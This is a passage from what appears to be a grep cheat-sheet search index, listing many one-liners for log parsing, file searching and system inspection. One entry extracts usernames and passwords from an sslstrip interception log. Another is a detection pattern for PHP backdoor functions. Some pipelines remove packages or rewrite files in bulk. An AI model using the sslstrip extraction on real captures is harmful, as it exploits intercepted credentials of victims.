of line"},{"location":"linux/grep/#search-objective-c-source-file-for-tag-listing-and-sort","text":"grep '.tag =' <file> | awk '{print $3}' | awk 'sub(/[;]/, x)' | sort -n","title":"Search Objective-C source file for tag listing and sort"},{"location":"linux/grep/#search-for-a--string-inside-all-files-in-the-current-directory_2","text":"grep -RnisI <pattern> *","title":"Search for a  string inside all files in the current directory"},{"location":"linux/grep/#search-for-a--string-inside-all-files-in-the-current-directory_3","text":"grep -RnisI <pattern> *","title":"Search for a  string inside all files in the current directory"},{"location":"linux/grep/#check-if-a-file-is-text","text":"grep -qIm1 . $file","title":"Check if a file is text"},{"location":"linux/grep/#see-how-many-times-youve-typed-ls-by-itself","text":"grep -c ^ls$ ~/.bash_history","title":"See how many times you've typed 'ls' by itself"},{"location":"linux/grep/#matching-strings","text":"grep -l <string-to-match> * | xargs grep -c <string-not-to-match> | grep '\\:0'","title":"Matching Strings"},{"location":"linux/grep/#remove-script-from-infected-html-files","text":"grep -ZlRr -e BAD_SCRIPT_LINE * |xargs -0 sed -i 's/BAD_SCRIPT_LINE//g'","title":"remove script from infected html files"},{"location":"linux/grep/#extract-names-and-email-addresses-from-ldif-files","text":"grep -E '^(cn|mail):' file.ldif | sed -e 's/^[a-z]*: //'","title":"Extract names and email addresses from LDIF files"},{"location":"linux/grep/#display-playing-parameters-of-soundcards","text":"grep -r \"\" /proc/asound/card*/pcm*/sub*/hw_params","title":"Display playing parameters of soundcards"},{"location":"linux/grep/#extract-email-adresses-from-some-file-or-any-other-pattern_2","text":"grep -aEio '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\\.[[:alpha:].]{2,6})'","title":"extract email adresses from some file (or any other pattern)"},{"location":"linux/grep/#find-php-command-backdoor","text":"grep -RPl include=*.{php,txt,asp} \"(passthru|shell_exec|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readf?ile) *\\(\" /var/www/","title":"find php command backdoor"},{"location":"linux/grep/#show-cpu-idle-and-used-time","text":"grep \"cpu \" /proc/stat | awk -F ' ' '{total = $2 + $3 + $4 + $5} END {print \"idle \\t used\\n\" $5*100/total \"% \" $2*100/total \"%\"}'","title":"Show CPU idle and used time"},{"location":"linux/grep/#lines-in-file2-that-are-not-in-file1","text":"grep -Fxv -f file1 file2","title":"lines in file2 that are not in file1"},{"location":"linux/grep/#shows-the-line-of-the-string-you-want-to-search-for-like-in-normal-grep-plus-n-number-of-lines-above-and-below-it","text":"grep -C <no_of_lines> <string>","title":"Shows the line of the string you want to search for (like in normal grep) plus 'n' number of lines above and below it."},{"location":"linux/grep/#grep-for-specific-function-invocations","text":"grep -E -rn color=always exclude-dir=\".svn\" exclude-dir=\"packages\" exclude=\"*.swp\" \"(emit|on)\\([\\'\\\"]leader\" ~/project/ | less -R","title":"grep for specific function invocations"},{"location":"linux/grep/#grep-2-words-existing-on-the-same-line","text":"grep -E/egrep 'word1.*word2|word2.*word1' \"$@\"","title":"grep 2 words existing on the same line"},{"location":"linux/grep/#search-ruby-files-with-non-ascii-character-but-without-encoding-directive","text":"grep -l include '*.rb' include '*.rake' '^[^#]*[^a-zA-Z0-9[:punct:][:space:]]' -R . | xargs -L1 awk '!/encoding/ && NR < 2 { print FILENAME }'","title":"Search ruby-files with non-ascii character, but without encoding directive"},{"location":"linux/grep/#fix-selinux-problem-with-postfix-on-centos","text":"grep postfix /var/log/messages | audit2allow -M mypolicy","title":"Fix SELinux problem with Postfix on Centos"},{"location":"linux/grep/#find-text-in-all-files-except-in-files-matching-a-pattern","text":"grep -lir 'aMethodName' * | grep -v 'target'","title":"Find text in all files, except in files matching a pattern"},{"location":"linux/grep/#get-http-codes-for-all-websites-in-apache-configuration-files","text":"grep -h 'Server\\(Name\\|Alias\\)' /etc/httpd/conf.d/*.conf | sed 's#\\s*Server\\(Name\\|Alias\\)\\s*##g' | tr ' ' \"\\n\" | xargs -I{} sh -c 'echo {},`curl -s -o /dev/null -w \"%{http_code}\" {}`'","title":"Get HTTP Codes for All Websites in Apache Configuration files."},{"location":"linux/grep/#grep-certain-file-types-recursively","text":"grep -r include=\"*.[ch]\" pattern .","title":"grep certain file types recursively"},{"location":"linux/grep/#finds-javascript-lodashunderscore-methods-in-source-code","text":"grep -roh '_\\.[^(]*' *.js","title":"Finds javascript lodash/underscore methods in source code"},{"location":"linux/grep/#recursive-grep-of-text-files","text":"grep -Ir foo *","title":"recursive grep of text files"},{"location":"linux/grep/#get-the-first-non-empty-line-in-a-text-file","text":"grep . \"$f\" | head -n1","title":"Get the first non-empty line in a text file"},{"location":"linux/grep/#checklist-for-64-bit-java-on-linux","text":"grep -l 'flags.*\\<lm\\>' /proc/cpuinfo && (getconf LONG_BIT | grep '64') && java -version","title":"checklist for 64-bit java on Linux"},{"location":"linux/grep/#match-non-empty-lines","text":"grep -v \"^\\W$\" <filename>","title":"Match non-empty lines"},{"location":"linux/grep/#check-if-hardware-is-32bit-or-64bit_1","text":"grep \" lm \" /proc/cpuinfo > /dev/null && echo \"64-bit\" || echo \"32-bit\"","title":"Check if hardware is 32bit or 64bit"},{"location":"linux/grep/#extract-email-adresses-from-some-file-or-any-other-pattern_3","text":"grep -Eio '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\\.[[:alpha:].]{2,6})'","title":"extract email adresses from some file (or any other pattern)"},{"location":"linux/grep/#list-all-available-disks-and-disk-partitions","text":"grep -e \"[sh]d[a-l][0-9]\\?\" /proc/partitions | awk '{print $4}'","title":"list all available disks and disk partitions"},{"location":"linux/grep/#grep-all-class-definitions-from-all-files-in-current-directory","text":"grep -RE 'class\\s+(\\w+)' color *","title":"grep all class definitions from all files in current directory"},{"location":"linux/grep/#count-empty-lines-using-grep","text":"grep -c \"^$\" filename","title":"Count empty lines using grep"},{"location":"linux/grep/#grep-ip-addresses-from-access-attempts-to-a-page-and-add-them-to-an-ipset-referenced-by-an-iptables-rule","text":"grep page.php /var/log/httpd/access_log|awk '{print $1}'|sort|uniq|perl -e 'while (<STDIN>){chomp; $cmd=`ipset add banned -! -q $_`; }'","title":"Grep ip addresses from access attempts to a page and add them to an ipset referenced by an iptables rule"},{"location":"linux/grep/#display-how-much-memory-installed-on-system","text":"grep MemTotal: /proc/meminfo # display how much memory installed","title":"Display how much memory installed on system"},{"location":"linux/grep/#grep-for-ip4-addresses","text":"grep -E \"[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\"","title":"grep for ip4 addresses"},{"location":"linux/grep/#to-remove-blank-line","text":"grep . filename >filename1","title":"to remove blank line"},{"location":"linux/grep/#grep-tab-chars","text":"grep \"^V<TAB>\" your_file","title":"grep tab chars"},{"location":"linux/grep/#grep-multiple-value-matches-that-matches-all-togetger--one-the-same-valueconcurrency-also","text":"grep '^\\(default\\|smtp\\|relay\\)[^ ]*concurrency[^ ]*'","title":"grep multiple value matches that matches all togetger  one the same value(concurrency) also"},{"location":"linux/grep/#export-usernames-and-passwords-from-sslstrip-log","text":"grep -i -f password_tokens sslstrip.log | awk ' BEGIN { RS=\"&\" } { print $1 }' | grep -i -f tokens_file","title":"Export usernames and passwords from sslstrip log"},{"location":"linux/grep/#grep-for-text-in-a-specific-file-type","text":"grep -rnw <directory to search for> -e include \\*.x \"your_text\"","title":"grep for text in a specific file type"},{"location":"linux/grep/#look-some-php-code-by-some-keywords","text":"grep -r include=*.php \"something\" /foo/bar","title":"look some php code by some keywords"},{"location":"linux/grep/#grep-for-text-in-a-specific-file-type_1","text":"grep -rnw include \\*.x -e \"text\" <dir>","title":"grep for text in a specific file type"},{"location":"linux/grep/#count-match-string-lines-from-files_1","text":"grep -c \"search_string\" /path/to/file","title":"count match string lines from file(s)"},{"location":"linux/grep/#reads-a-list-of-urls-fetches-each-one-and-logs-the-url-and-http-status-code","text":"grep \"$1\" urls.txt | awk '{print \"curl write-out \"$0\"=http-%{http_code}\\\"\\n\\\" silent output /dev/null \"$0'} | sh >> responses.txt","title":"Reads a list of urls, fetches each one and logs the url and http status code"},{"location":"linux/grep/#get-all-domains-from-html","text":"grep -oP '(?<=www\\.)\\s?[^\\/]*' file | uniq","title":"Get all domains from html"},{"location":"linux/grep/#grep-a-pdf-file","text":"grep -i '[^script$]' 1.txt","title":"GREP a PDF file."},{"location":"linux/grep/#recursive-grep-of-all-c-source-under-the-current-directory","text":"grep -R include=*.cpp include=*.h exclude=*.inl.h \"string\" .","title":"Recursive grep of all c++ source under the current directory"},{"location":"linux/grep/#remove-superfluous-from-conf-file","text":"grep -Ev '^( *$|#)' < conf.file","title":"Remove superfluous from conf file"},{"location":"linux/grep/#extract-only-the-subroutine-names-from-a-perl-script","text":"grep -Po '^sub (\\w+)' file.pm | cut -d' ' -f2","title":"extract only the subroutine names from a perl script"},{"location":"linux/grep/#extract-all-urls-from-the-last-firefox-sessionstorejs-file-used","text":"grep -oP '\"url\":\"\\K[^\"]+' $(ls -t ~/.mozilla/firefox/*/sessionstore.js | sed q)","title":"Extract all urls from the last firefox sessionstore.js file used."},{"location":"linux/grep/#find-files-ending-in-log-that-contain-both-foo-and-error","text":"grep -l foo $(grep -l error *.log)","title":"find files ending in *.log that contain both 'foo' and 'error'"},{"location":"linux/grep/#btrfs-find-file-names-with-checksum-errors_1","text":"grep \"btrfs: checksum error at logical\" /var/log/messages | egrep -o \"[^ ]+$\" | tr -d ')' | sort | uniq","title":"Btrfs: Find file names with checksum errors"},{"location":"linux/grep/#find-files-that-contain-foo-but-not-bar","text":"grep -l foo *cl*.log | xargs grep -lL bar","title":"find files that contain foo, but not bar"},{"location":"linux/grep/#get-the-date-field-from-syslog-for-a-certain-set-of-events","text":"grep xxxx messages | cut -d ' ' -f 1,2,3","title":"Get the date field from syslog for a certain set of events"},{"location":"linux/grep/#kworker-issue-phase-one-find-the-culprit","text":"grep enabled /sys/firmware/acpi/interrupts/*","title":"kworker issue. Phase one: find the culprit."},{"location":"linux/grep/#tail-from-the-last-occurrence-of-a-pattern-to-the-end-of-the-log-file","text":"grep -n PATTERN /logs/somelog.log | cut -f1 -d: | tail -1 | xargs -I num tail -n +num /logs/somelog.log","title":"tail from the last occurrence of a pattern to the end of the (log) file"},{"location":"linux/grep/#find-highest-context-switches","text":"grep -H voluntary_ctxt /proc/*/status |gawk '{ split($1,proc,\"/\"); if ( $2 > 10000000 ) { printf $2 \" - Process : \"; system(\"ps h -o cmd -p \"proc[3]) } }' | sort -nk1,1 | sed 's/^/Context Switches: /g'","title":"Find highest context switches"},{"location":"linux/grep/#grep-recursively-your-python-project-with-color-highlighting-the-result-and-line-numbers","text":"grep color=always -nr 'setLevel' include=*py | less -SRqg","title":"Grep recursively your Python project with color highlighting the result and line numbers"},{"location":"linux/grep/#grep-tab-t_1","text":"grep $'\\t' sample.txt","title":"grep tab (t)"},{"location":"linux/grep/#recursively-grep-thorugh-directory-for-string-in-file_2","text":"grep -r -i \"phrase\" directory/","title":"Recursively grep thorugh directory for string in file."},{"location":"linux/grep/#exclude-svn-directories-with-grep_1","text":"grep -r exclude-dir=.svn PATTERN PATH","title":"Exclude svn directories with grep"},{"location":"linux/grep/#grep-recursively-through-single-file-extension_1","text":"grep include=*.py -lir \"delete\" .","title":"Grep Recursively Through Single File Extension"},{"location":"linux/grep/#remove-todays-debian-installed-packages_1","text":"grep -e `date +%Y-%m-%d` /var/log/dpkg.log | awk '/install / {print $4}' | uniq | xargs apt-get -y remove","title":"Remove today's Debian installed packages"},{"location":"linux/grep/#list-your-installed-firefox-extensions_2","text":"grep -hIr :name ~/.mozilla/firefox/*.default/extensions | tr '<>=' '\"\"\"' | cut -f3 -d'\"' | sort -u","title":"List your installed Firefox extensions"},{"location":"linux/grep/#find-out-how-much-data-is-waiting-to-be-written-to-disk_1","text":"grep ^Dirty /proc/meminfo","title":"Find out how much data is waiting to be written to disk"},{"location":"linux/grep/#grep-binary-hexadecimal-patterns_1","text":"grep -P \"\\x05\\x00\\xc0\" mybinaryfile","title":"grep binary (hexadecimal) patterns"},{"location":"linux/grep/#remove-newlines-from-output_1","text":"grep . filename","title":"Remove newlines from output"},{"location":"linux/grep/#grep-syslog-today-last-hour_1","text":"grep -i \"$(date +%b\\ %d\\ %H)\" syslog","title":"Grep syslog today last hour"},{"location":"linux/grep/#grep-log-between-range-of-minutes_1","text":"grep -i \"$(date +%b\" \"%d )13:4[0-5]\" syslog","title":"Grep log between range of minutes"},{"location":"linux/grep/#colorized-grep-in-less_1","text":"grep color=always | less -R","title":"Colorized grep in less"},{"location":"linux/grep/#remove-blank-lines-from-a-file-using-grep-and-save-output-to-new-file_2","text":"grep . filename > newfilename","title":"Remove blank lines from a file using grep and save output to new file"},{"location":"linux/grep/#get-all-possible-problems-from-any-log-files_1","text":"grep -2 -iIr \"err\\|warn\\|fail\\|crit\" /var/log/*","title":"Get all possible problems from any log files"},{"location":"linux/grep/#intersection-between-two-files_1","text":"grep -Fx -f file1 file2","title":"intersection between two files"},{"location":"linux/grep/#count-occurrences-per-minute-in-a-log-file_1","text":"grep <something> logfile | cut -c2-18 | uniq -c","title":"Count occurrences per minute in a log file"},{"location":"linux/grep/#search-and-replace-across-multiple-files_1","text":"grep -lr -e '<oldword>' * | xargs sed -i 's/<oldword>/<newword>/g'","title":"Search and Replace across multiple files"},{"location":"linux/grep/#quick-keyvalue-display-within-proc-or-sys_1","text":"grep -r . /sys/class/net/eth0/statistics","title":"Quick key/value display within /proc or /sys"},{"location":"linux/grep/#remove-todays-installed-packages_1","text":"grep \"install \" /var/log/dpkg.log | awk '{print $4}' | xargs apt-get -y remove purge","title":"Remove today's installed packages"},{"location":"linux/grep/#print-number-of-mb-of-free-ram_1","text":"grep '^MemFree:' /proc/meminfo | awk '{ mem=($2)/(1024) ; printf \"%0.0f MB\\n\", mem }'","title":"Print number of mb of free ram"},{"location":"linux/grep/#number-of-cpus-in-a-system_3","text":"grep \"processor\" /proc/cpuinfo | wc -l","title":"Number of CPU's in a system"},{"location":"linux/grep/#recursive-search-and-replace-old-with-new-string-inside-files_2","text":"grep -rl oldstring . | parallel sed -i -e 's/oldstring/newstring/'","title":"recursive search and replace old with new string, inside files"},{"location":"linux/grep/#delete-files-containing-matching-text_1","text":"grep -r -Z -l \"<text>\" . | xargs -0 echo rm","title":"delete files containing matching text"},{"location":"linux/grep/#grep-apache-accesslog-and-list-ips-by-hits-and-date---sorted_1","text":"grep Mar/2009 /var/log/apache2/access.log | awk '{ print $1 }' | sort -n | uniq -c | sort -rn | head","title":"grep apache access.log and list IP's by hits and date - sorted"},{"location":"linux/grep/#find-files-containing-text_4","text":"grep -lir \"some text\" *","title":"find files containing text"},{"location":"linux/grep/#recover-a-deleted-file_1","text":"grep -a -B 25 -A 100 'some string in the file' /dev/sda1 > results.txt","title":"Recover a deleted file"},{"location":"linux/grep/#embed-referred-images-in-html-files_1","text":"grep -ioE \"(url\\(|src=)['\\\"]?[^)'\\\"]*\" a.html | grep -ioE \"[^\\\"'(]*.(jpg|png|gif)\" | while read l ; do sed -i \"s>$l>data:image/${l/[^.]*./};base64,`openssl enc -base64 -in $l| tr -d '\\n'`>\" a.html ; done;","title":"embed referred images in HTML files"},{"location":"linux/grep/#remove-comments-and-empty-lines-from-a-conf-file_1","text":"grep ^[^#] /etc/file.conf","title":"Remove comments and empty lines from a conf file"},{"location":"linux/grep/#replace-all-tabs-with-spaces-in-an-application_1","text":"grep -PL \"\\t\" -r . | grep -v \".svn\" | xargs sed -i 's/\\t/ /g'","title":"Replace all tabs with spaces in an application"},{"location":"linux/grep/#finding-the-number-of-cpus_1","text":"grep -c -e '^cpu[0-9]\\+' /proc/stat","title":"Finding the number of cpu's"},{"location":"linux/grep/#extract-email-adresses-from-some-file-or-any-other-pattern_4","text":"grep -Eio '([[:alnum:]_.]+@[[:alnum:]_]+?\\.[[:alpha:].]{2,6})' file.html","title":"extract email adresses from some file (or any other pattern)"},{"location":"linux/grep/#grep-for-tabs-without-using-ctrl-v-trick_1","text":"grep -P '\\t' filename","title":"grep for tabs without using Ctrl-V trick"},{"location":"linux/grep/#list-the-cpu-model-name_2","text":"grep \"model name\" /proc/cpuinfo","title":"List the CPU model name"},{"location":"linux/grep/#cat-a-bunch-of-small-files-with-file-indication_1","text":"grep . *","title":"cat a bunch of small files with file indication"},{"location":"linux/grep/#edit-all-files-found-having-a-specific-string-found-by-grep_3","text":"grep -Hrli 'foo' * | xargs vim","title":"Edit all files found having a specific string found by grep"},{"location":"linux/grep/#search-for-a--string-inside-all-files-in-the-current-directory_4","text":"grep -r <pattern> * .[!.]*","title":"Search for a  string inside all files in the current directory"},{"location":"linux/grep/#search-for-a-string-in-all-files-recursively_2","text":"grep -ir string *","title":"Search for a string in all files recursively"},{"location":"linux/grep/#find-common-groups-between-two-users_1","text":"grep -xFf <(groups user1|cut -f3- -d\\ |sed 's/ /\\n/g') <(groups user2|cut -f3- -d\\ |sed 's/ /\\n/g')","title":"Find common groups between two users"},{"location":"linux/grep/#regenerate-the-etcmtab-file_1","text":"grep -v rootfs /proc/mounts > /etc/mtab","title":"Regenerate the /etc/mtab file"},{"location":"linux/grep/#search-files-with-js-declarations-inside_1","text":"grep -r \"<script\" | grep -v src | awk -F: '{print $1}' | uniq","title":"Search files with js declarations inside"},{"location":"linux/grep/#extract-ipv4-addressess-from-file_1","text":"grep -Eo \\([0-9]\\{1,3\\}[\\.]\\)\\{3\\}[0-9] file | sort | uniq","title":"Extract IPv4 addressess from file"},{"location":"linux/grep/#grep--v-with-multiple-patterns_2","text":"grep test somefile | grep -v -e error -e critical -e warning","title":"grep -v with multiple patterns."},{"location":"linux/grep/#search-some-text-from-all-files-inside-a-directory_1","text":"grep -Hrn \"text\" .","title":"Search some text from all files inside a directory"},{"location":"linux/grep/#recursively-grep-thorugh-directory-for-string-in-file_3","text":"grep -rni string dir","title":"Recursively grep thorugh directory for string in file."},{"location":"linux/grep/#output-files-without-comments-or-empty-lines_1","text":"grep -v \"^\\($\\|#\\)\" <filenames>","title":"Output files without comments or empty lines"},{"location":"linux/grep/#search-through-files-ignoring-svn_1","text":"grep <pattern> -R . exclude-dir='.svn'","title":"Search through files, ignoring .svn"},{"location":"linux/grep/#grep-lines-containing-two-consecutive-hyphens_2","text":"grep file","title":"grep lines containing two consecutive hyphens"},{"location":"linux/grep/#check-if-hardware-is-32bit-or-64bit_2","text":"grep -q '\\<lm\\>' /proc/cpuinfo && echo 64 bits || echo 32 bits","title":"Check if hardware is 32bit or 64bit"},{"location":"linux/grep/#lists-unambigously-names-of-all-xml-elements-used-in-files-in-current-directory_2","text":"grep -h -o '<[^/!?][^ >]*' * | sort -u | cut -c2-","title":"Lists unambigously names of all xml elements used in files in current directory"},{"location":"linux/grep/#remove-text-from-file1-which-is-in-file2-and-stores-it-in-an-other-file_1","text":"grep -Fvf file1 file2 > file-new","title":"Remove text from file1 which is in file2 and stores it in an other file"},{"location":"linux/grep/#extract-all-404-errors-from-your-apache-accesslog-prefix-lines-by-occurrences-number_1","text":"grep \"HTTP/1.1\\\" 404\" access_log | awk '{print $7 } ' | sort | uniq -c | sort -n","title":"Extract all 404 errors from your apache accesslog (prefix lines by occurrences number)"},{"location":"linux/grep/#search-trought-pidgins-conversation-logs-for-searchterm-and-output-the-result_1","text":"grep -Ri searchterm ~/.purple/logs/* | sed -e 's/<.*?>//g'","title":"Search trought pidgin's conversation logs for \"searchterm\", and output the result."},{"location":"linux/grep/#prints-line-numbers_2","text":"grep -n \"^\" <filename>","title":"Prints line numbers"},{"location":"linux/grep/#display-a-one-liner-of-current-nagios-exit-statuses-great-with-netcatirccat_1","text":"grep current_state= /var/log/nagios/status.dat|sort|uniq -c|sed -e \"s/[\\t ]*\\([0-9]*\\).*current_state=\\([0-9]*\\)/\\2:\\1/\"|tr \"\\n\" \" \"","title":"display a one-liner of current nagios exit statuses. great with netcat/irccat"},{"location":"linux/grep/#shows-the-torrent-file-name-along-with-the-trackers-url_1","text":"grep -ao -HP \"http://[^/]*/\" *","title":"Shows the torrent file name along with the trackers url"},{"location":"linux/grep/#grep--v-with-multiple-patterns_3","text":"grep 'test' somefile | grep -vE '(error|critical|warning)'","title":"grep -v with multiple patterns."},{"location":"linux/grep/#read-funny-developer-comments-in-the-linux-source-tree_1","text":"grep -2riP '\\b(fuck|shit|bitch|tits|ass\\b)' /usr/src/linux/","title":"Read funny developer comments in the Linux source tree"},{"location":"linux/grep/#dump-a-configuration-file-without-comments-or-whitespace_1","text":"grep -v \"\\ *#\\|^$\" /etc/path/to.config","title":"Dump a configuration file without comments or whitespace..."},{"location":"linux/grep/#find-all-files-containing-a-word_1","text":"grep -rHi searchphrase *.php","title":"Find all files containing a word"},{"location":"linux/grep/#returns-the-number-of-cores-in-a-linux-machine_1","text":"grep -c ^processor /proc/cpuinfo","title":"Returns the number of cores in a linux machine."},{"location":"linux/grep/#peak-amount-of-memory-occupied-by-any-process-with-foo-in-its-name_1","text":"grep VmHWM /proc/$(pgrep -d '/status /proc/' FOO)/status","title":"peak amount of memory occupied by any process with \"FOO\" in its name"},{"location":"linux/grep/#determine-configure-options-used-for-mysql-binary-builds_1","text":"grep CONFIG $(which mysqlbug)","title":"Determine configure options used for MySQL binary builds"},{"location":"linux/grep/#remove-blank-lines-from-a-file-using-grep-and-save-output-to-new-file_3","text":"grep -v \"^$\" filename > newfilename","title":"Remove blank lines from a file using grep and save output to new file"},{"location":"linux/grep/#makes-a-zenity-select-list-based-on-entries-in-your-wpa_supplicantconf_1","text":"grep -oE \"ssid=\\\".*\\\"\" /etc/wpa_supplicant.conf | cut -c6- | sed s/\\\"//g | zenity list title=\"Choose Access Point\" column=\"SSID\"","title":"Makes a Zenity select list based on entries in your wpa_supplicant.conf"},{"location":"linux/grep/#strip-config-files-of-comments_1","text":"grep -vE '^$|^[\\s]*[;#]'","title":"strip config files of comments"},{"location":"linux/grep/#creates-podfeedstxt-a-file-that-lists-the-urls-of-rhythmbox-podcasts-from-the-rhythmdbxml-file_1","text":"grep -A 5 -e podcast-feed rhythmdb.xml | grep -e \"<location>\" | sed 's: *<!--*[a-t]*-->::g' > PodFeeds.txt","title":"Creates PodFeeds.txt, a file that lists the URLs of rhythmbox podcasts from the rhythmdb.xml file."},{"location":"linux/grep/#sort-and-count-subjects-of-emails-stuck-in-exim-queue_1","text":"grep -R Subject /var/spool/exim/input/ | sed s/^.*Subject:\\ // | sort | uniq -c | sort -n > ~/email_sort.$(date +%m.%d.%y).txt","title":"Sort and count subjects of emails stuck in Exim queue"},{"location":"linux/grep/#get-debian-package-names-corresponding-to-latex-packages-used-in-a-document_1","text":"grep -R usepackage * | cut -d']' -f2 | cut -s -d'{' -f 2 | sed s/\"}\"/.sty\"}\"/g | cut -d'}' -f1 | sort | uniq | xargs dpkg -S | cut -d':' -f1 | sort | uniq","title":"Get debian package names corresponding to latex packages used in a document"},{"location":"linux/grep/#recursive-search-and-replace-old-with-new-string-inside-files_3","text":"grep -rlZ oldstring . | xargs -0 sed -i -e 's/oldstring/newstring/'","title":"recursive search and replace old with new string, inside files"},{"location":"linux/grep/#count-lines-in-a-file-with-grep_1","text":"grep -c \".*\" filename","title":"Count lines in a file with grep"},{"location":"linux/grep/#search-and-replace-in-multiple-files-recursively_1","text":"grep -lr \"foo\" . | xargs sed -i \"s/foo/bar/g\"","title":"Search and replace in multiple files recursively"},{"location":"linux/grep/#list-last-opened-tabs-in-firefox-browser_1","text":"grep -Eo '\"entries\":\\[{\"url\":\"[^\"]*\"' \"$HOME/.mozilla/firefox/*.default/sessionstore.js\" | sed 's/^.*:\"//; s/\"$//'","title":"List last opened tabs in firefox browser"},{"location":"linux/grep/#view-all-lines-without-comments_1","text":"grep -v \"^#\" file.txt | more","title":"view all lines without comments."},{"location":"linux/grep/#list-the-cpu-model-name_3","text":"grep 'model\\|MHz' /proc/cpuinfo |tail -n 2","title":"List the CPU model name"},{"location":"linux/grep/#look-up-a-unicode-character-by-name_1","text":"grep -i \"$*\" /usr/lib/perl5/Unicode/CharName.pm | while read a b; do /usr/bin/printf \"\\u$a\\tU+%s\\t%s\\n\" \"$b\"; done","title":"Look up a unicode character by name"},{"location":"linux/grep/#count-match-string-lines-from-files_2","text":"grep -in \"search_string\" /to/your/path","title":"count match string lines from file(s)"},{"location":"linux/grep/#extract-email-adresses-from-some-file-or-any-other-pattern_5","text":"grep -aEio '([[:alnum:]_.-\\+\\-]+@[[:alnum:]_.-]+?\\.[[:alpha:].]{2,6})'","title":"extract email adresses from some file (or any other pattern)"},{"location":"linux/grep/#search-for-a--string-inside-all-files-in-the-current-directory_5","text":"grep -nisI <pattern> * .[!.]*","title":"Search for a  string inside all files in the current directory"},{"location":"linux/grep/#apache-statistics_1","text":"grep \"10/Sep/2013\" access.log| cut -d[ -f2 | cut -d] -f1 | awk -F: '{print $2\":\"$3}' | sort -nk1 -nk2 | uniq -c | awk '{ if ($1 > 10) print $0}'","title":"apache statistics"},{"location":"linux/grep/#grep-by-paragraph-instead-of-by-line_1","text":"grepp() { [ $# -eq 1 ] && perl -00ne \"print if /$1/i\" || perl -00ne \"print if /$1/i\" < \"$2\";}","title":"Grep by paragraph instead of by line."},{"location":"linux/grep/#sort-netflow-packet-capture_1","text":"grep -o -P '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\:[0-9]{1,5}\\s->\\s{5}[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\:[0-9]{1,5}' <capture file> | tr -d ' ' | sed 's/:.....//g' | sort -n | uniq -c | sort -nr","title":"Sort netflow packet capture"},{"location":"linux/grep/#check-spell-in-c-source-code_1","text":"grep -o -h -rE '\".*\"' * | ispell -l -p ~/mydict | sort -u","title":"check spell in c source code"},{"location":"linux/grep/#find-files-containing-text_5","text":"grep -lir \"sometext\" * > sometext_found_in.log","title":"find files containing text"},{"location":"linux/grep/#find-files-beginning-with-filename-that-do-not-include-string_1","text":"grep -L \"string\" filename*","title":"find files beginning with filename* that do not include \"string\""},{"location":"linux/grep/#number-of-cpus-in-a-system_4","text":"grep -c ^processor /proc/cpuinfo","title":"Number of CPU's in a system"},{"location":"linux/grep/#this-allows-you-to-find-a-string-on-a-set-of-files-recursivly_1","text":"grep -rF include='*.txt' stringYouLookFor *","title":"This allows you to find a string on a set of files recursivly"},{"location":"linux/grep/#sorted-list-of-dhcp-allocations_1","text":"grep ^lease /var/lib/dhcp/dhcpd.leases | cut -d ' ' -f 2 | sort -t . -k 1,1n -k 2,2n -k 3,3n -k 4,4n | uniq","title":"sorted list of dhcp allocations"},{"location":"linux/grep/#extract-all-ips-from-a-file_1","text":"grep -E '([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})' -o tmp","title":"Extract all IPs from a file"},{"location":"linux/grep/#search-for-string-through-files_1","text":"grep -Rl \"pattern\" files_or_dir","title":"Search for string through files"},{"location":"linux/grep/#number-of-cpus-in-a-system_5","text":"grep -cE \"^processor\" /proc/cpuinfo","title":"Number of CPU's in a system"},{"location":"linux/grep/#grep-colorized_1","text":"grep -i color=auto","title":"Grep colorized"},{"location":"linux/grep/#show-lines-that-are-not-commented-out_1","text":"grep \"^[^#;]\" /etc/php.ini","title":"Show lines that are not commented out"},{"location":"linux/grep/#get-with-grep-exact-x-strings-matches-from-output_1","text":"grep \"^[A-Za-z0-9]\\{6\\}$\" myfile.txt","title":"get with grep exact x strings matches from output"},{"location":"linux/grep/#check-where-mail-was-sent-from_1","text":"grep cwd /var/log/exim_mainlog | grep -v /var/spool | awk -F\"cwd=\" '{print $2}' | awk '{print $1}' | sort | uniq -c | sort -n","title":"Check where mail was sent from"},{"location":"linux/grep/#show-a-config-file-without-comments_2","text":"grep -v ^# /etc/somefile.conf | grep .","title":"Show a config file without comments"},{"location":"linux/grep/#search-in-files_1","text":"grep -i -h 'account.journal.cashbox.line' *.py","title":"Search in files"},{"location":"linux/grep/#cat-a-config-file-removing-all-comments-and-blank-lines_1","text":"grep -vh '^[[:space:]]*\\(#\\|$\\)' <file>","title":"cat a config file removing all comments and blank lines"},{"location":"linux/grep/#remove-comments-and-empty-lines-from-a-file_1","text":"grep -v '^#\\|^$' /etc/hdparm.conf","title":"Remove comments and empty lines from a file"},{"location":"linux/grep/#grep-for-word-in-directory-recursive_1","text":"grep color=auto -iRnH \"$search_word\" $directory","title":"Grep for word in directory (recursive)"},{"location":"linux/grep/#find-all-files-matching-namexml-and-search-for-text-within-them_1","text":"grep -nH \"text\" -r . include *name.xml","title":"Find all files matching 'name.xml' and search for 'text' within them"},{"location":"linux/grep/#shows-whether-your-cpu-supports-64bit-mode_1","text":"grep -q ' lm ' /proc/cpuinfo; [ $? -eq 0 ] && echo '64bit supported'","title":"shows whether your CPU supports 64bit mode"},{"location":"linux/grep/#get-the-url-for-the-git-annex-webapp_1","text":"grep URL ~/annex/.git/annex/webapp.html | tr -d '\">' | awk -F= '{print $4 \"=\" $5}'","title":"Get the URL for the git-annex webapp"},{"location":"linux/grep/#ip-list-of-aborted-mail-logins_1","text":"grep -i \"aborted login\" /var/log/maillog | awk 'BEGIN{FS=\"=\"}{print substr($4,8)}' | cut -d\",\" -f1","title":"IP list of aborted mail logins"},{"location":"linux/grep/#btrfs-find-file-names-with-checksum-errors_2","text":"grep \"checksum error at logical\" /var/log/messages | egrep -o \"[^ ]+$\" | tr -d ')' | sort | uniq","title":"Btrfs: Find file names with checksum errors"},{"location":"linux/grep/#grep-for-non-empty-lines-that-do-not-start-with--comments-or--and-does-not-include_1","text":"grep -v -e '^$' -e '^[#\\[]' -e '\\/' some_file","title":"Grep for non-empty lines that do not start with # (comments) or  and does not include 